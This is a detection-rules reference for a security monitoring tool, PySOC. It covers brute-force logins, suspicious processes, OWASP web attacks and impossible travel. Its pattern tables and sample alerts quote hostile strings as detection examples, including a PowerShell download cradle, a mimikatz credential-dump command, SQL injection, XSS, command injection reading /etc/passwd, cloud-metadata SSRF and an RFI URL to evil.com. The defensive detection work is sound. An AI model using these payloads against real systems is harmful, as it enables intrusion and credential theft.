# Detection Rules

This document is the canonical reference for every detection rule shipped
with PySOC. Each rule has:

- A stable **rule ID** (e.g. `BF-001`) used in alerts, reports, and tests.
- A **trigger condition** — the exact logic that fires the alert.
- **MITRE ATT&CK** technique mappings.
- **Tuning knobs** — parameters that control sensitivity.
- **Sample alert** — what the JSON output looks like.
- **Test coverage** — which unit/integration tests cover this rule.

Adding a new rule? See [`DEVELOPMENT.md`](DEVELOPMENT.md).

---

## BF-001 — Brute-force login (SSH/Windows)

| Field | Value |
|---|---|
| **Source** | `linux_auth`, `windows_json` (EventID 4624/4625) |
| **MITRE ATT&CK** | T1110 — Brute Force |
| **Default severity** | HIGH |
| **Tuning** | `threshold=5`, `window_seconds=600` |

### Trigger

Group failed-login events by `(source_ip, user_name)`. For each bucket,
apply a sliding window: if **≥ `threshold` failures** occur within
**`window_seconds` seconds**, emit one `HIGH` alert summarising the burst.
Multiple non-overlapping bursts from the same source produce multiple
alerts.

The detector skips events that lack a `source_ip` or `user_name`.

### Sample alert

```json
{
  "rule_id": "BF-001",
  "rule_name": "Brute-force login (SSH/Windows)",
  "severity": "high",
  "description": "6 failed logins for user 'root' from 203.0.113.5 within 35s",
  "timestamp": "2026-03-07T14:10:35+00:00",
  "source_events": ["sha256:...", "sha256:...", "..."],
  "context": {
    "source_ip": "203.0.113.5",
    "user": "root",
    "failed_attempts": 6,
    "window_seconds": 600,
    "first_seen": "2026-03-07T14:10:00+00:00",
    "last_seen": "2026-03-07T14:10:35+00:00",
    "auth_methods": ["ssh2"],
    "source_types": ["linux_auth"],
    "note": "Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP."
  }
}
```

### Test coverage

- `tests/unit/test_detect_brute_force.py` — 6 unit tests.
- `tests/integration/test_end_to_end.py::test_brute_force_detector_catches_root_burst`
- `tests/integration/test_end_to_end.py::test_brute_force_detector_catches_admin_burst`
- `tests/integration/test_end_to_end.py::test_windows_brute_force_detected`

---

## SP-001 — Suspicious process execution

| Field | Value |
|---|---|
| **Source** | `windows_json` (EventID 4688), or any event with `event_action == "process_create"` |
| **MITRE ATT&CK** | T1059.001 (PowerShell), T1003.001/.002 (credential dumping), T1218 (System Binary Proxy Execution), T1204.002 (User Execution: File) |
| **Default severity** | HIGH (CRITICAL for mimikatz) |
| **Tuning** | Pattern set is hard-coded in `suspicious_process.py`. Add new patterns by editing `_RE_*` constants. |

### Trigger

For each process-creation event, run the command line against a curated set
of regex signatures. Each signature has its own sub-severity; the alert's
overall severity is `max(sub_severities)`.

Patterns shipped:

| Pattern | Severity | MITRE | What it matches |
|---|---|---|---|
| `encoded_powershell` | HIGH | T1059.001 | `powershell -EncodedCommand <base64>` (also `-e`, `-enc`). Decoded payload included in context. |
| `powershell_download_cradle` | HIGH | T1059.001 | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| `mimikatz` | CRITICAL | T1003.002 | `mimikatz.exe` anywhere in the command line |
| `procdump` | HIGH | T1003.001 | `procdump.exe` anywhere in the command line |
| `rundll32_network` | HIGH | T1218.011 | `rundll32.exe` invoked with a URL argument |
| `certutil_loldb` | MEDIUM | T1218 | `certutil.exe -urlcache`/`-decode`/`-encode` |
| `suspicious_parent_child:<parent>-><child>` | HIGH | T1204.002 | Office apps (Word/Excel/Outlook/Acrobat) spawning `cmd.exe` or `powershell.exe` |

### Sample alert

```json
{
  "rule_id": "SP-001",
  "rule_name": "Suspicious process execution",
  "severity": "critical",
  "description": "Suspicious process execution detected: mimikatz",
  "context": {
    "user": "admin",
    "process_name": "C:\\Temp\\mimikatz.exe",
    "process_parent_name": "C:\\Windows\\System32\\...\\powershell.exe",
    "command_line": "mimikatz.exe sekurlsa::logonpasswords exit",
    "matched_patterns": ["mimikatz"],
    "mitre_attack_ids": ["T1003.002"],
    "decoded_payload": null
  }
}
```

### Test coverage

- `tests/unit/test_detect_suspicious_process.py` — 7 unit tests.
- `tests/integration/test_end_to_end.py::test_suspicious_processes_detected_in_windows_events`

---

## WA-001 — Web attack patterns (OWASP Top-10)

| Field | Value |
|---|---|
| **Source** | `nginx`, `apache` (any event with `event_action == "http_request"`) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application), T1059.007 (JavaScript), T1083 (File and Directory Discovery) |
| **Default severity** | HIGH (CRITICAL for SSRF cloud-metadata and `/etc/passwd` probes) |
| **Tuning** | Pattern set is hard-coded in `web_attacks.py`. |

### Trigger

For each HTTP request event, concatenate `http_url` + `http_user_agent`
and run the resulting string against a curated set of regex signatures,
organised by OWASP family:

| Family | Patterns | Example |
|---|---|---|
| **SQLi** | `union select`, `' OR '1'='1`, `--`/`#`/`/*` comments, `sleep(N)`, `select ... from` | `/search?q=1' OR '1'='1` |
| **XSS** | `<script>` tag, `onerror=`/`onload=` event handlers, `javascript:` URI, `<img ... onerror=>` | `/search?q=<script>alert(1)</script>` |
| **Path traversal** | `../` literal, `%2e%2e%2f` encoded, `/etc/passwd` literal | `/../../etc/passwd` |
| **Command injection** | `;`/`|`/`` ` `` after a query parameter | `/ping?host=8.8.8.8;cat /etc/passwd` |
| **SSRF** | `169.254.169.254` (cloud metadata), `http://localhost` | `/fetch?url=http://169.254.169.254/...` |
| **RFI** | Query parameter whose value is `http(s)://` | `/?page=http://evil.com/shell.txt` |

If **multiple distinct families** fire on the same request, the alert's
severity is at least HIGH (scanner behaviour). The overall severity is
`max(sub_severities)`.

### Sample alert

```json
{
  "rule_id": "WA-001",
  "rule_name": "Web attack patterns (OWASP Top-10)",
  "severity": "critical",
  "description": "Web attack pattern(s) detected: ssrf_metadata, rfi_remote",
  "context": {
    "source_ip": "203.0.113.8",
    "http_method": "GET",
    "http_url": "/fetch?url=http://169.254.169.254/latest/meta-data/",
    "http_status_code": 200,
    "http_user_agent": "curl/8.4.0",
    "matched_patterns": ["ssrf_metadata", "rfi_remote"],
    "mitre_attack_ids": ["T1190"],
    "families_matched": ["rfi", "ssrf"],
    "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
  }
}
```

### Test coverage

- `tests/unit/test_detect_web_attacks.py` — 9 unit tests.
- `tests/integration/test_end_to_end.py::test_web_attacks_detected_in_nginx`

---

## IT-001 — Impossible travel (anomalous geo-velocity)

| Field | Value |
|---|---|
| **Source** | Any event with `event_action == "login"` and `event_outcome == "success"` |
| **MITRE ATT&CK** | T1078 — Valid Accounts |
| **Default severity** | MEDIUM |
| **Tuning** | `max_speed_kmh=900` (commercial-aviation cruising speed), `min_distance_km=500` |

### Trigger

For each user, sort successful-login events chronologically. For each
**consecutive pair** `(a, b)`:

1. Resolve the country of each side via `source_geo_country` (preferred) or
   the synthetic GeoIP helper in `src/pysoc/geo.py`.
2. Skip pairs where either side is internal (`ZZ`) or unknown (`XX`).
3. Skip pairs where both sides resolved to the same country.
4. Compute the great-circle distance via haversine.
5. If `distance < min_distance_km`, skip.
6. Compute implied speed = `distance / delta_hours`.
7. If `implied_speed > max_speed_kmh`, emit a `MEDIUM` alert.

The detector emits **one alert per anomalous pair**, so a user who logs in
from US → CN → RU in 90 minutes produces two alerts.

### Sample alert

```json
{
  "rule_id": "IT-001",
  "rule_name": "Impossible travel (anomalous geo-velocity)",
  "severity": "medium",
  "description": "Impossible travel for user 'alice': login from US at 2026-03-07T14:00:00+00:00 then from CN at 2026-03-07T14:30:00+00:00 (11587 km in 0:30:00).",
  "context": {
    "user": "alice",
    "from_country": "US",
    "to_country": "CN",
    "from_ip": "1.2.3.4",
    "to_ip": "5.6.7.8",
    "distance_km": 11587.0,
    "time_delta_seconds": 1800,
    "implied_speed_kmh": 23174.0,
    "max_speed_kmh": 900,
    "first_login_at": "2026-03-07T14:00:00+00:00",
    "second_login_at": "2026-03-07T14:30:00+00:00",
    "note": "Possible false positives: corporate VPN that egresses through different POPs, mobile device switching between cell tower and Wi-Fi. Correlate with MFA challenge response."
  }
}
```

### Test coverage

- `tests/unit/test_detect_impossible_travel.py` — 6 unit tests.
- `tests/integration/test_end_to_end.py::test_impossible_travel_detected`

---

## Severity model

PySOC uses a five-level severity scale: `INFO < LOW < MEDIUM < HIGH < CRITICAL`.
The mapping is defined in `src/pysoc/models.py:Severity`. Severities are
JSON-serialised as lowercase strings.

Each detector's default severity can be overridden at construction time:

```python
from pysoc.detect import BruteForceDetector
from pysoc.models import Severity

# Tune BF-001 down to MEDIUM for a noisy environment
det = BruteForceDetector(severity=Severity.MEDIUM)
```
